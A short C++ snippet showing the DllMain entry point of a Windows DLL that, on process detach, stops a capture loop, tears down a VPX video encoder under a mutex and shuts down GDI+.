BOOL APIENTRY DllMain(HMODULE, DWORD reason, LPVOID) {
    if (reason == DLL_PROCESS_DETACH) {
        g_captureRunning.store(false);
        {
            lock_guard<mutex> enc_lock(g_encoderMutex);
            if (g_vpxEncoderInitialized) {
                g_vpx.destroy(&g_vpxEncoder);
                g_vpxEncoderInitialized = false;
            }
            g_vpx.Unload();
        }
        shutdown_gdiplus();
    }
    return TRUE;
}
